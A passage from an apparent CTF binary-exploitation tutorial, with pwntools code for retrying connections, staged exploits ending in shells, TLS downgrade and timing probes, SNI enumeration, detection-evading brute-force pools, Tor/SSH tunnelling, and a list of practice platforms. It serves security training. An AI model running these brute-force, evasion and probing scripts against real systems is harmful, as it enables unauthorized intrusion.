                if attempt < self.max_retries - 1:
                    time.sleep(self.retry_delay)
                else:
                    log.error("Max retries reached")
                    raise
        return False
    
    def send_with_retry(self, data, max_attempts=3):
        """Send with retry on failure"""
        for attempt in range(max_attempts):
            try:
                self.conn.send(data)
                return True
            except Exception as e:
                log.warning(f"Send failed (attempt {attempt + 1}): {e}")
                if attempt < max_attempts - 1:
                    # Try to reconnect
                    self._connect_with_retry()
                else:
                    raise
        return False
    
    def recv_with_retry(self, size=None, timeout=5, max_attempts=3):
        """Receive with retry on failure"""
        for attempt in range(max_attempts):
            try:
                return self.conn.recv(size, timeout=timeout)
            except EOFError:
                log.warning("Connection closed, attempting reconnect")
                if attempt < max_attempts - 1:
                    self._connect_with_retry()
                else:
                    raise
            except Exception as e:
                log.warning(f"Recv failed (attempt {attempt + 1}): {e}")
                if attempt < max_attempts - 1:
                    time.sleep(1)
                else:
                    raise
        return None
    
    def __getattr__(self, name):
        """Forward other methods to underlying connection"""
        return getattr(self.conn, name)

# Usage
p = RetryableConnection('target.com', 1337, max_retries=5)
p.send_with_retry(payload)
response = p.recv_with_retry(timeout=10)
```

**Idempotent Operation Retry:**

```python
def retry_idempotent(operation, *args, max_attempts=3, **kwargs):
    """
    Retry operation that can be safely repeated
    
    [Inference] Only use for operations that don't change state
    or can be safely repeated (GET requests, reads, etc.)
    """
    last_exception = None
    
    for attempt in range(max_attempts):
        try:
            result = operation(*args, **kwargs)
            if attempt > 0:
                log.success(f"Succeeded on attempt {attempt + 1}")
            return result
        except Exception as e:
            last_exception = e
            log.warning(f"Attempt {attempt + 1} failed: {e}")
            if attempt < max_attempts - 1:
                time.sleep(1)
    
    log.error(f"Operation failed after {max_attempts} attempts")
    raise last_exception

# Example: Retrying leak operation
def leak_address(p):
    p.sendline(b'%p')
    return int(p.recvline().strip(), 16)

leaked_addr = retry_idempotent(leak_address, p, max_attempts=5)
log.info(f"Leaked address: {hex(leaked_addr)}")
```

### Partial Failure Handling

**Stateful Retry:**

```python
class StatefulExploit:
    """
    Exploit with checkpoint/resume capability
    """
    def __init__(self, host, port):
        self.host = host
        self.port = port
        self.conn = None
        self.state = 'initial'
        self.leaked_data = {}
    
    def run(self):
        """Execute exploit with state tracking"""
        try:
            if self.state == 'initial':
                self.connect()
                self.state = 'connected'
            
            if self.state == 'connected':
                self.leak_addresses()
                self.state = 'leaked'
            
            if self.state == 'leaked':
                self.send_payload()
                self.state = 'exploited'
            
            if self.state == 'exploited':
                self.get_shell()
                self.state = 'complete'
            
            log.success("Exploit complete!")
            
        except Exception as e:
            log.error(f"Exploit failed at state '{self.state}': {e}")
            log.info("Can resume from last successful state")
            raise
    
    def connect(self):
        """Stage 1: Connect"""
        self.conn = remote(self.host, self.port)
        log.success("Connected")
    
    def leak_addresses(self):
        """Stage 2: Leak addresses"""
        self.conn.sendline(b'%p %p %p')
        leaks = self.conn.recvline().strip().split()
        self.leaked_data['stack'] = int(leaks[0], 16)
        self.leaked_data['libc'] = int(leaks[1], 16)
        log.success(f"Leaked addresses: {self.leaked_data}")
    
    def send_payload(self):
        """Stage 3: Send exploit payload"""
        payload = self.construct_payload()
        self.conn.sendline(payload)
        log.success("Payload sent")
    
    def construct_payload(self):
        """Build payload using leaked data"""
        # Use self.leaked_data to build ROP chain
        return b'payload_here'
    
    def get_shell(self):
        """Stage 4: Interact with shell"""
        self.conn.interactive()
    
    def resume(self):
        """Resume from last state"""
        log.info(f"Resuming from state: {self.state}")
        if self.state != 'initial' and self.conn is None:
            self.conn = remote(self.host, self.port)
        self.run()

# Usage
exploit = StatefulExploit('target.com', 1337)
try:
    exploit.run()
except:
    log.info("Exploit interrupted, can resume later")
    # Later:
    # exploit.resume()
```

## TLS/Encrypted Channel Exploitation

Exploiting services over encrypted connections requires additional handling for TLS/SSL.

### TLS Connection Handling

**Basic TLS Connection:**

```python
from pwn import *
import ssl

def connect_tls(host, port, verify=False):
    """
    Establish TLS connection
    """
    # Create regular socket first
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((host, port))
    
    # Wrap with TLS
    context = ssl.create_default_context()
    
    if not verify:
        # Disable certificate verification (CTF scenarios)
        context.check_hostname = False
        context.verify_mode = ssl.CERT_NONE
    
    tls_sock = context.wrap_socket(sock, server_hostname=host)
    
    log.success(f"TLS connection established")
    log.info(f"Cipher: {tls_sock.cipher()}")
    log.info(f"Protocol: {tls_sock.version()}")
    
    # Create pwntools tube from socket
    p = remote.fromsocket(tls_sock)
    return p

# Usage
p = connect_tls('target.com', 443, verify=False)
p.sendline(b'GET / HTTP/1.1\r\nHost: target.com\r\n\r\n')
response = p.recvline()
log.info(f"Response: {response}")
```

**Custom TLS Configuration:**

```python
def connect_tls_custom(host, port, ciphers=None, tls_version=None):
    """
    TLS connection with custom cipher/version
    """
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((host, port))
    
    context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
    context.check_hostname = False
    context.verify_mode = ssl.CERT_NONE
    
    # Set specific TLS version
    if tls_version:
        if tls_version == '1.0':
            context.minimum_version = ssl.TLSVersion.TLSv1
            context.maximum_version = ssl.TLSVersion.TLSv1
        elif tls_version == '1.2':
            context.minimum_version = ssl.TLSVersion.TLSv1_2
            context.maximum_version = ssl.TLSVersion.TLSv1_2
        elif tls_version == '1.3':
            context.minimum_version = ssl.TLSVersion.TLSv1_3
    
    # Set specific ciphers
    if ciphers:
        context.set_ciphers(ciphers)
        log.info(f"Using ciphers: {ciphers}")
    
    tls_sock = context.wrap_socket(sock, server_hostname=host)
    
    # Get negotiated parameters
    log.success(f"TLS established")
    log.info(f"Protocol: {tls_sock.version()}")
    log.info(f"Cipher: {tls_sock.cipher()[0]}")
    
    return remote.fromsocket(tls_sock)

# Usage - force weak cipher for exploitation
p = connect_tls_custom(
    'target.com', 
    443,
    ciphers='DES-CBC3-SHA:RC4-SHA',  # Weak ciphers
    tls_version='1.0'
)
```

### Certificate Handling

**Client Certificate Authentication:**

```python
def connect_with_client_cert(host, port, certfile, keyfile):
    """
    TLS connection with client certificate authentication
    """
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((host, port))
    
    context = ssl.create_default_context()
    context.check_hostname = False
    context.verify_mode = ssl.CERT_NONE
    
    # Load client certificate and key
    context.load_cert_chain(certfile=certfile, keyfile=keyfile)
    
    tls_sock = context.wrap_socket(sock, server_hostname=host)
    
    log.success("TLS connection with client cert established")
    
    return remote.fromsocket(tls_sock)

# Usage
p = connect_with_client_cert(
    'target.com',
    443,
    certfile='client.crt',
    keyfile='client.key'
)
```

**Certificate Information Extraction:**

```python
def extract_cert_info(host, port):
    """
    Extract and analyze server certificate
    """
    import ssl
    from cryptography import x509
    from cryptography.hazmat.backends import default_backend
    
    # Get certificate
    cert_pem = ssl.get_server_certificate((host, port))
    
    # Parse certificate
    cert = x509.load_pem_x509_certificate(cert_pem.encode(), default_backend())
    
    log.info("Certificate Information:")
    log.info(f"  Subject: {cert.subject}")
    log.info(f"  Issuer: {cert.issuer}")
    log.info(f"  Serial: {cert.serial_number}")
    log.info(f"  Not Before: {cert.not_valid_before}")
    log.info(f"  Not After: {cert.not_valid_after}")
    
    # Extract Subject Alternative Names
    try:
        san_ext = cert.extensions.get_extension_for_oid(
            x509.oid.ExtensionOID.SUBJECT_ALTERNATIVE_NAME
        )
        san_names = san_ext.value.get_values_for_type(x509.DNSName)
        log.info(f"  SANs: {san_names}")
    except:
        pass
    
    return cert

# Usage
cert = extract_cert_info('target.com', 443)
```

### SNI (Server Name Indication) Handling

**Custom SNI in TLS:**

```python
def connect_with_custom_sni(host, port, sni_hostname):
    """
    Connect with custom SNI hostname
    Useful for virtual hosting exploitation
    """
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((host, port))
    
    context = ssl.create_default_context()
    context.check_hostname = False
    context.verify_mode = ssl.CERT_NONE
    
    # Specify different SNI hostname
    tls_sock = context.wrap_socket(
        sock, 
        server_hostname=sni_hostname  # SNI sent to server
    )
    
    log.success(f"Connected to {host}:{port} with SNI: {sni_hostname}")
    
    return remote.fromsocket(tls_sock)

# Usage - access different virtual host
p = connect_with_custom_sni(
    '10.0.0.1',      # Actual IP
    443,
    'admin.target.com'  # SNI hostname for admin interface
)
```

**SNI Enumeration:**

```python
def enumerate_sni_hosts(ip, port, hostnames):
    """
    Test multiple SNI hostnames to discover virtual hosts
    """
    results = {}
    
    for hostname in hostnames:
        try:
            p = connect_with_custom_sni(ip, port, hostname)
            p.sendline(b'GET / HTTP/1.1\r\nHost: ' + hostname.encode() + b'\r\n\r\n')
            response = p.recvline(timeout=2)
            
            results[hostname] = {
                'accessible': True,
                'response': response[:100]
            }
            
            log.success(f"{hostname}: Accessible")
            p.close()
            
        except Exception as e:
            results[hostname] = {
                'accessible': False,
                'error': str(e)
            }
            log.warning(f"{hostname}: Failed - {e}")
    
    return results

# Usage
hostnames = [
    'www.target.com',
    'admin.target.com',
    'internal.target.com',
    'api.target.com'
]

results = enumerate_sni_hosts('10.0.0.1', 443, hostnames)
```

### HTTPS Request Exploitation

**HTTP Over TLS with Custom Headers:**

```python
def exploit_https_endpoint(host, port, path, payload, method='POST'):
    """
    Send exploit payload over HTTPS
    """
    p = connect_tls(host, port, verify=False)
    
    # Construct HTTP request
    if method == 'POST':
        request = f'POST {path} HTTP/1.1\r\n'
        request += f'Host: {host}\r\n'
        request += 'Content-Type: application/x-www-form-urlencoded\r\n'
        request += f'Content-Length: {len(payload)}\r\n'
        request += 'Connection: keep-alive\r\n'
        request += '\r\n'
        request += payload.decode('latin-1')
    else:
        request = f'GET {path} HTTP/1.1\r\n'
        request += f'Host: {host}\r\n'
        request += 'Connection: close\r\n'
        request += '\r\n'
    
    log.info(f"Sending {method} request to {path}")
    p.send(request.encode('latin-1'))
    
    # Receive response
    response = b''
    while True:
        try:
            chunk = p.recv(4096, timeout=2)
            if not chunk:
                break
            response += chunk
        except:
            break
    
    log.info(f"Received {len(response)} bytes")
    return response

# Usage
payload = b'username=admin&password=' + b'A' * 1000
response = exploit_https_endpoint('target.com', 443, '/login', payload)
```

**WebSocket Over TLS:**

```python
import base64
import hashlib

def websocket_handshake(host, port, path='/'):
    """
    Establish WebSocket connection over TLS
    """
    p = connect_tls(host, port, verify=False)
    
    # Generate WebSocket key
    ws_key = base64.b64encode(os.urandom(16)).decode()
    
    # Send upgrade request
    handshake = f'GET {path} HTTP/1.1\r\n'
    handshake += f'Host: {host}\r\n'
    handshake += 'Upgrade: websocket\r\n'
    handshake += 'Connection: Upgrade\r\n'
    handshake += f'Sec-WebSocket-Key: {ws_key}\r\n'
    handshake += 'Sec-WebSocket-Version: 13\r\n'
    handshake += '\r\n'
    
    p.send(handshake.encode())
    
    # Receive handshake response
    response = p.recvuntil(b'\r\n\r\n')
    
    if b'101 Switching Protocols' in response:
        log.success("WebSocket handshake successful")
        return p
    else:
        log.error("WebSocket handshake failed")
        return None

def send_websocket_frame(p, data, opcode=0x1):
    """
    Send WebSocket frame (text/binary)
    opcode: 0x1 = text, 0x2 = binary
    """
    frame = bytes([0x80 | opcode])  # FIN bit + opcode
    
    length = len(data)
    if length < 126:
        frame += bytes([0x80 | length])  # Mask bit + length
    elif length < 65536:
        frame += bytes([0x80 | 126]) + length.to_bytes(2, 'big')
    else:
        frame += bytes([0x80 | 127]) + length.to_bytes(8, 'big')
    
    # Masking key (required for client-to-server)
    mask = os.urandom(4)
    frame += mask
    
    # Mask payload
    masked_data = bytes([data[i] ^ mask[i % 4] for i in range(len(data))])
    frame += masked_data
    
    p.send(frame)

# Usage
ws = websocket_handshake('target.com', 443, '/ws')
if ws:
    send_websocket_frame(ws, b'{"exploit": "payload"}')
    response = ws.recv(4096)
```

### TLS Version Downgrade Attacks

**Force TLS 1.0 (Potentially Vulnerable):**

```python
def attempt_tls_downgrade(host, port):
    """
    Attempt to force older TLS versions
    [Unverified] Success depends on server configuration
    """
    versions = [
        ('TLS 1.3', ssl.TLSVersion.TLSv1_3, ssl.TLSVersion.TLSv1_3),
        ('TLS 1.2', ssl.TLSVersion.TLSv1_2, ssl.TLSVersion.TLSv1_2),
        ('TLS 1.1', ssl.TLSVersion.TLSv1_1, ssl.TLSVersion.TLSv1_1),
        ('TLS 1.0', ssl.TLSVersion.TLSv1, ssl.TLSVersion.TLSv1),
    ]
    
    results = {}
    
    for name, min_ver, max_ver in versions:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((host, port))
            
            context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE
            context.minimum_version = min_ver
            context.maximum_version = max_ver
            
            tls_sock = context.wrap_socket(sock, server_hostname=host)
            
            results[name] = {
                'supported': True,
                'cipher': tls_sock.cipher()
            }
            
            log.success(f"{name}: Supported - {tls_sock.cipher()[0]}")
            tls_sock.close()
            
        except Exception as e:
            results[name] = {
                'supported': False,
                'error': str(e)
            }
            log.warning(f"{name}: Not supported")
    
    return results

# Usage
results = attempt_tls_downgrade('target.com', 443)

# If TLS 1.0 supported, may be vulnerable to BEAST, POODLE, etc.
if results.get('TLS 1.0', {}).get('supported'):
    log.warning("TLS 1.0 supported - potential vulnerabilities present")
```

### Encrypted Channel Timing Attacks

**Timing Analysis Over TLS:**

```python
import statistics

def timing_attack_tls(host, port, test_inputs, samples=10):
    """
    Perform timing attack over TLS connection
    [Inference] TLS adds overhead but timing differences may still be observable
    """
    results = {}
    
    for test_input in test_inputs:
        timings = []
        
        for _ in range(samples):
            p = connect_tls(host, port, verify=False)
            
            start = time.time()
            p.sendline(test_input)
            try:
                p.recvline(timeout=5)
            except:
                pass
            elapsed = time.time() - start
            
            timings.append(elapsed)
            p.close()
            
            time.sleep(0.1)  # Rate limiting
        
        # Calculate statistics
        results[test_input.decode()] = {
            'mean': statistics.mean(timings),
            'median': statistics.median(timings),
            'stdev': statistics.stdev(timings) if len(timings) > 1 else 0,
            'min': min(timings),
            'max': max(timings)
        }
        
        log.info(f"{test_input.decode()}: mean={results[test_input.decode()]['mean']:.4f}s")
    
    return results

# Usage - detect valid usernames by response time
test_users = [b'admin', b'root', b'user', b'invalid']
timing_results = timing_attack_tls('target.com', 443, test_users, samples=20)

# Analyze for timing differences
mean_times = [(user, data['mean']) for user, data in timing_results.items()]
mean_times.sort(key=lambda x: x[1], reverse=True)

log.info("Sorted by response time:")
for user, mean_time in mean_times:
    log.info(f"  {user}: {mean_time:.4f}s")
```

### STARTTLS Protocol Handling

**SMTP STARTTLS Example:**

```python
def smtp_starttls_exploit(host, port=25):
    """
    Connect to SMTP server and upgrade to TLS
    """
    # Initial plaintext connection
    p = remote(host, port)
    
    # Receive banner
    banner = p.recvline()
    log.info(f"Banner: {banner.decode().strip()}")
    
    # Send EHLO
    p.sendline(b'EHLO attacker.com')
    response = p.recvuntil(b'250 ')
    log.info(f"EHLO response: {response.decode().strip()}")
    
    # Request STARTTLS
    p.sendline(b'STARTTLS')
    response = p.recvline()
    log.info(f"STARTTLS response: {response.decode().strip()}")
    
    if b'220' in response:
        # Upgrade to TLS
        context = ssl.create_default_context()
        context.check_hostname = False
        context.verify_mode = ssl.CERT_NONE
        
        # Wrap existing socket
        tls_sock = context.wrap_socket(
            p.sock,
            server_hostname=host
        )
        
        # Create new tube from TLS socket
        tls_p = remote.fromsocket(tls_sock)
        
        log.success("STARTTLS upgrade successful")
        
        # Now communicate over TLS
        tls_p.sendline(b'EHLO attacker.com')
        response = tls_p.recvuntil(b'250 ')
        log.info(f"TLS EHLO response: {response.decode()}")
        
        return tls_p
    else:
        log.error("STARTTLS failed")
        return None

# Usage
smtp_tls = smtp_starttls_exploit('mail.target.com', 25)
if smtp_tls:
    # Send exploit over encrypted channel
    smtp_tls.sendline(b'MAIL FROM:<attacker@evil.com>')
```

**IMAP STARTTLS:**

```python
def imap_starttls_exploit(host, port=143):
    """
    IMAP STARTTLS upgrade
    """
    p = remote(host, port)
    
    # Receive greeting
    greeting = p.recvline()
    log.info(f"IMAP greeting: {greeting.decode().strip()}")
    
    # Request STARTTLS
    p.sendline(b'A001 STARTTLS')
    response = p.recvline()
    
    if b'OK' in response:
        # Upgrade to TLS
        context = ssl.create_default_context()
        context.check_hostname = False
        context.verify_mode = ssl.CERT_NONE
        
        tls_sock = context.wrap_socket(p.sock, server_hostname=host)
        tls_p = remote.fromsocket(tls_sock)
        
        log.success("IMAP STARTTLS successful")
        return tls_p
    else:
        log.error("STARTTLS not available")
        return None

# Usage
imap_tls = imap_starttls_exploit('mail.target.com')
if imap_tls:
    imap_tls.sendline(b'A002 LOGIN admin password')
```

### Proxy and Tunneling

**SOCKS Proxy for Remote Exploitation:**

```python
import socks

def connect_via_socks(host, port, proxy_host, proxy_port):
    """
    Connect through SOCKS proxy
    """
    # Configure SOCKS
    socks.set_default_proxy(socks.SOCKS5, proxy_host, proxy_port)
    
    # Create socket through proxy
    sock = socks.socksocket()
    sock.connect((host, port))
    
    log.success(f"Connected to {host}:{port} via SOCKS proxy")
    
    # Wrap with TLS if needed
    context = ssl.create_default_context()
    context.check_hostname = False
    context.verify_mode = ssl.CERT_NONE
    
    tls_sock = context.wrap_socket(sock, server_hostname=host)
    
    return remote.fromsocket(tls_sock)

# Usage - exploit through Tor or other SOCKS proxy
p = connect_via_socks('hiddenservice.onion', 443, '127.0.0.1', 9050)
```

**SSH Tunneling for Exploitation:**

```python
import subprocess
import threading

def setup_ssh_tunnel(ssh_host, ssh_user, local_port, remote_host, remote_port):
    """
    Setup SSH tunnel for exploitation
    """
    # SSH command for port forwarding
    ssh_cmd = [
        'ssh',
        '-N',  # No command execution
        '-L', f'{local_port}:{remote_host}:{remote_port}',
        f'{ssh_user}@{ssh_host}'
    ]
    
    # Start tunnel in background
    tunnel_process = subprocess.Popen(
        ssh_cmd,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE
    )
    
    log.info(f"SSH tunnel: localhost:{local_port} -> {remote_host}:{remote_port}")
    log.info("Waiting for tunnel to establish...")
    time.sleep(2)
    
    return tunnel_process

def exploit_via_tunnel(local_port, payload):
    """
    Exploit through SSH tunnel
    """
    # Connect to local end of tunnel
    p = remote('127.0.0.1', local_port)
    
    log.info("Connected through SSH tunnel")
    p.sendline(payload)
    
    return p

# Usage
tunnel = setup_ssh_tunnel(
    'jumphost.com',
    'user',
    local_port=9999,
    remote_host='internal-target.local',
    remote_port=1337
)

try:
    p = exploit_via_tunnel(9999, exploit_payload)
    p.interactive()
finally:
    tunnel.terminate()
```

### Rate Limiting and Evasion

**Intelligent Rate Limiting:**

```python
class RateLimitedConnection:
    """
    Connection with built-in rate limiting
    """
    def __init__(self, host, port, requests_per_second=1):
        self.host = host
        self.port = port
        self.rate_limit = 1.0 / requests_per_second
        self.last_request_time = 0
        self.conn = None
    
    def connect(self):
        """Establish connection"""
        self.conn = remote(self.host, self.port)
        log.success("Connected with rate limiting enabled")
    
    def send_rate_limited(self, data):
        """Send with automatic rate limiting"""
        # Calculate time since last request
        elapsed = time.time() - self.last_request_time
        
        if elapsed < self.rate_limit:
            sleep_time = self.rate_limit - elapsed
            log.info(f"Rate limiting: sleeping {sleep_time:.2f}s")
            time.sleep(sleep_time)
        
        # Send data
        self.conn.send(data)
        self.last_request_time = time.time()
    
    def sendline_rate_limited(self, data):
        """Sendline with rate limiting"""
        self.send_rate_limited(data + b'\n')
    
    def __getattr__(self, name):
        """Forward other methods"""
        return getattr(self.conn, name)

# Usage - avoid detection/blocking
rate_limited = RateLimitedConnection('target.com', 1337, requests_per_second=0.5)
rate_limited.connect()

for i in range(10):
    rate_limited.sendline_rate_limited(f'test {i}'.encode())
    response = rate_limited.recvline()
```

**Randomized Timing:**

```python
import random

def send_with_random_delay(p, data, min_delay=1, max_delay=5):
    """
    Send with randomized delay to evade pattern detection
    """
    delay = random.uniform(min_delay, max_delay)
    log.info(f"Waiting {delay:.2f}s before sending")
    time.sleep(delay)
    
    p.sendline(data)

# Usage - brute force with timing randomization
for password in password_list:
    send_with_random_delay(p, f'LOGIN admin {password}'.encode(), 2, 10)
    response = p.recvline(timeout=5)
    
    if b'Success' in response:
        log.success(f"Password found: {password}")
        break
```

### Connection Pool Management

**Pool for Parallel Exploitation:**

```python
from concurrent.futures import ThreadPoolExecutor, as_completed

class ConnectionPool:
    """
    Manage pool of connections for parallel operations
    """
    def __init__(self, host, port, pool_size=5):
        self.host = host
        self.port = port
        self.pool_size = pool_size
        self.connections = []
        self.lock = threading.Lock()
    
    def initialize(self):
        """Create connection pool"""
        for i in range(self.pool_size):
            try:
                conn = remote(self.host, self.port, level='error')
                self.connections.append(conn)
                log.info(f"Pool connection {i+1}/{self.pool_size} established")
            except Exception as e:
                log.error(f"Failed to create connection {i+1}: {e}")
        
        log.success(f"Connection pool initialized: {len(self.connections)} connections")
    
    def get_connection(self):
        """Get connection from pool"""
        with self.lock:
            if self.connections:
                return self.connections.pop()
            else:
                log.warning("Pool exhausted, creating new connection")
                return remote(self.host, self.port)
    
    def return_connection(self, conn):
        """Return connection to pool"""
        with self.lock:
            if len(self.connections) < self.pool_size:
                self.connections.append(conn)
            else:
                conn.close()
    
    def execute_parallel(self, func, tasks):
        """Execute function on multiple connections"""
        results = []
        
        with ThreadPoolExecutor(max_workers=self.pool_size) as executor:
            futures = {}
            
            for task in tasks:
                conn = self.get_connection()
                future = executor.submit(func, conn, task)
                futures[future] = (conn, task)
            
            for future in as_completed(futures):
                conn, task = futures[future]
                try:
                    result = future.result()
                    results.append((task, result))
                except Exception as e:
                    log.error(f"Task {task} failed: {e}")
                    results.append((task, None))
                finally:
                    self.return_connection(conn)
        
        return results
    
    def close_all(self):
        """Close all connections"""
        for conn in self.connections:
            conn.close()
        self.connections = []

# Usage - parallel brute force
def try_password(conn, password):
    """Try single password"""
    conn.sendline(f'LOGIN admin {password}'.encode())
    response = conn.recvline(timeout=2)
    return b'Success' in response

pool = ConnectionPool('target.com', 1337, pool_size=10)
pool.initialize()

passwords = ['pass1', 'pass2', 'pass3', 'admin', 'password']
results = pool.execute_parallel(try_password, passwords)

for password, success in results:
    if success:
        log.success(f"Valid password: {password}")

pool.close_all()
```

**Important Considerations:**

[Inference] TLS/SSL adds computational overhead that may affect timing attack precision. Multiple samples and statistical analysis are necessary for reliable results.

[Unverified] Some TLS implementations may have side-channel vulnerabilities (Heartbleed, padding oracles, etc.). These depend heavily on specific library versions and configurations.

Modern TLS 1.3 implementations include additional protections:

- Encrypted SNI (ESNI) - hides hostname
- 0-RTT resumption - faster handshake but replay risks
- Forward secrecy - mandatory perfect forward secrecy

**Recommended Subtopics:**

- Man-in-the-Middle (MITM) attacks on TLS
- Certificate pinning bypass techniques
- HTTP/2 and HTTP/3 exploitation
- Advanced protocol smuggling techniques

---

# Practice Resources

## CTF Platform Familiarization

### Major Practice Platforms Overview

**Pwnable.kr**

````markdown
**Focus**: Linux binary exploitation fundamentals
**Difficulty**: Beginner to Advanced
**Environment**: SSH-based challenges on actual server
**Best for**: Learning classic exploitation techniques

Key characteristics:
- Challenges run on live system (realistic constraints)
- Source code provided for most challenges
- Progressive difficulty curve
- Strong focus on fundamental concepts

Recommended progression:
1. fd, collision, bof (basics)
2. flag, passcode, random (information leaks)
3. mistake, shellshock, coin1 (logic/race conditions)
4. blackjack, lotto, cmd1 (input manipulation)
5. blukat, horcruxes (intermediate exploitation)

Connection method:
```bash
ssh fd@pwnable.kr -p2222
password: guest

# Download challenge files
scp -P2222 fd@pwnable.kr:fd.c .
````

**Setup tips**:

- Keep local copies of source code for offline analysis
- Test exploits locally before trying on server (limited attempts on some challenges)
- Document failed attempts to avoid repetition

````

**Pwnable.tw**
```markdown
**Focus**: Advanced exploitation techniques, modern protections
**Difficulty**: Intermediate to Expert
**Environment**: Remote socket connections
**Best for**: Competition-style challenges with realistic protections

Key characteristics:
- No source code (realistic CTF scenario)
- Full protections enabled (NX, PIE, RELRO, Canary)
- Requires information leak + exploitation chain
- Shorter, focused challenges

Recommended progression:
1. start (basic buffer overflow)
2. orw (syscall restrictions, seccomp)
3. calc (expression parser vulnerability)
4. dubblesort (leak + ROP)
5. hacknote (heap exploitation, UAF)

Connection pattern:
```python
from pwn import *

# Standard connection template
p = remote('chall.pwnable.tw', 10000)
# Challenge-specific exploitation
p.interactive()
````

**Platform-specific considerations**:

- Connections may have timeouts (optimize exploit speed)
- Server resources shared (avoid infinite loops/crashes)
- Flag format: FLAG{...} or pwn{...}

````

**Pwnable.xyz**
```markdown
**Focus**: Short, focused exploitation puzzles
**Difficulty**: Beginner to Advanced
**Environment**: Docker-based remote challenges
**Best for**: Quick practice sessions, specific technique drilling

Key characteristics:
- Minimalist challenge design (focus on single concept)
- Modern environment (recent glibc, kernel)
- Docker containers (consistent environment)
- Point-based progression system

Challenge categories:
- Stack: Buffer overflows, ROP, canary bypass
- Heap: UAF, double-free, tcache attacks
- Format: Format string exploitation
- Misc: Logic bugs, race conditions, integer overflows

Access pattern:
```bash
# Challenges accessible via web interface
# Download binary: wget https://pwnable.xyz/challenges/[name]/[binary]
nc chall.pwnable.xyz [port]
````

````

**ROP Emporium**
```markdown
**Focus**: Return-Oriented Programming mastery
**Difficulty**: Beginner to Intermediate
**Environment**: Downloadable binaries for local practice
**Best for**: Systematic ROP learning progression

Challenge progression (in order):
1. ret2win - Basic ROP concept
2. split - Using gadgets to call functions
3. callme - Chaining multiple function calls
4. write4 - Writing data to memory with ROP
5. badchars - Encoding/decoding constraints
6. fluff - Limited gadget set challenges
7. pivot - Stack pivoting techniques
8. ret2csu - Abusing __libc_csu_init
9. ret2dlresolve - Advanced dynamic linker exploitation (x86 only)

Download structure:
```bash
# Available for x86 and x86-64
wget https://ropemporium.com/binary/ret2win.zip
unzip ret2win.zip

# Each challenge includes:
ret2win/
├── ret2win       # x86-64 binary
├── ret2win32     # x86 binary
├── libret2win.so # Shared library (if needed)
└── flag.txt      # Local flag for testing
````

**Practice approach**:

- Solve x86-64 version first (simpler calling convention)
- Then solve x86 version (different constraints/techniques)
- Compare solutions to understand architecture differences

````

**Nightmare (guyinatuxedo)**
```markdown
**Focus**: Comprehensive exploitation learning with detailed explanations
**Difficulty**: Beginner to Advanced
**Environment**: Curated collection from various CTFs
**Best for**: Structured learning with extensive documentation

Repository structure:
```bash
git clone https://github.com/guyinatuxedo/nightmare
cd nightmare

# Organized by exploitation category:
modules/
├── 00-intro/              # Getting started
├── 01-stack/              # Stack vulnerabilities
├── 02-heap/               # Heap exploitation
├── 03-format_strings/     # Format string bugs
├── 04-binary_exploitation/# Advanced techniques
└── [additional modules]

# Each challenge includes:
├── readme.md              # Explanation and walkthrough
├── binary                 # Challenge binary
├── exploit.py            # Reference exploit
└── [source if available]
````

**Learning approach**:

1. Read explanation in readme.md
2. Attempt challenge independently (set 30min timer)
3. If stuck, review hints section
4. Compare your solution to provided exploit
5. Document differences in approach

````

**CTFtime Practice Platforms**
```markdown
**Active practice sites with rotating challenges**:

1. **HackTheBox** (hackthebox.eu)
   - Pwn category with realistic scenarios
   - Retired challenges accessible with VIP
   - Regular new releases

2. **PicoCTF** (picoctf.org)
   - Educational focus, extensive hints
   - Permanent challenges (practice anytime)
   - Beginner-friendly progression

3. **CSAW 365** (365.csaw.io)
   - Year-round access to past CSAW CTF challenges
   - University-level difficulty
   - Real competition challenges

4. **pwn.college** (pwn.college)
   - Academic course structure
   - ASU's cybersecurity curriculum
   - Video lectures + hands-on challenges

5. **247CTF** (247ctf.com)
   - Always-online challenges
   - Automatic flag verification
   - Leaderboard for motivation
````

### Platform-Specific Techniques

**SSH-Based Challenges (pwnable.kr style)**

```bash
# Efficient workflow for SSH challenges

# 1. Initial reconnaissance
ssh challenge@pwnable.kr -p2222
ls -la
cat challenge.c  # Read source if available

# 2. Download files for local analysis
scp -P2222 challenge@pwnable.kr:* ./local_analysis/

# 3. Test locally with copied binary
cd local_analysis
gcc challenge.c -o challenge_local
./challenge_local < exploit_input.txt

# 4. Deploy to remote
cat exploit_input.txt | ssh challenge@pwnable.kr -p2222 './challenge'

# 5. For interactive exploits
ssh challenge@pwnable.kr -p2222 -tt 'python3 -c "import pty; pty.spawn(\"/bin/bash\")"'
```

**Common pitfalls**:

- Environment differences (local vs remote libc, system configuration)
- TTY requirements (some exploits need proper terminal)
- File permissions (can't write to challenge directory)

**Socket-Based Challenges (pwnable.tw style)**

```python
#!/usr/bin/env python3
from pwn import *

# Template for socket-based exploitation

# Configuration
HOST = 'chall.pwnable.tw'
PORT = 10000
BINARY = './challenge'

# Setup
elf = context.binary = ELF(BINARY)
libc = ELF('./libc.so.6')  # If provided

def connect():
    """Handle local vs remote connection"""
    if args.LOCAL:
        return process(BINARY)
    else:
        return remote(HOST, PORT)

def exploit():
    p = connect()
    
    # Stage 1: Information gathering
    # Many pwnable.tw challenges require leaks
    
    # Stage 2: Exploitation
    
    # Stage 3: Shell interaction
    p.interactive()

if __name__ == '__main__':
    exploit()
```

**Handling connection timeouts**:

```python
# Some platforms enforce strict timeouts
from pwn import *

p = remote('host', port)

# Set explicit timeout for operations
p.timeout = 10  # seconds

# Use recvuntil with timeout
try:
    p.recvuntil(b'prompt: ', timeout=5)
except EOFError:
    log.error("Connection closed (possible crash or timeout)")
```

### Platform Setup and Configuration

**Local Practice Environment**

```bash
#!/bin/bash
# setup_practice_env.sh

echo "[*] Setting up CTF practice environment"

# Create directory structure
mkdir -p ~/ctf_practice/{binaries,exploits,notes,tools}

# Install essential tools
sudo apt update
sudo apt install -y \
    gdb \
    python3-pip \
    python3-dev \
    git \
    netcat \
    socat \
    vim \
    tmux \
    binutils \
    gcc-multilib \
